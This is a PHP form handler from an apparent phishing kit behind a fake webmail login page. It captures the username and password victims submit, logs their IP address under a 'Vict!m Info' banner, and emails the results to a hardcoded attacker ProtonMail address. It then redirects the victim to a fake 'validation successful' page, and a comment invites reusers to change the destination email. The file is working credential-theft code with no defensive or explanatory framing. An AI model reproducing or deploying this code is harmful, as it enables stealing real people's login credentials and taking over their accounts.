<?
if($_POST["loginid"]){
$ip = getenv("REMOTE_ADDR");

$message .= "--------------Webmail Login-----------------------\n";
$message .= "Username            : ".$_POST['loginid']."\n";
$message .= "Password            : ".$_POST['password']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "---------------Created BY Dee-------------\n";
//change ur email here
$send = "rn01wlx@protonmail.com";
$subject = "Webmail Rezult";
$headers = "From:Webmailz";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 
     header("Location: Validation_successful.html");
     }

?>
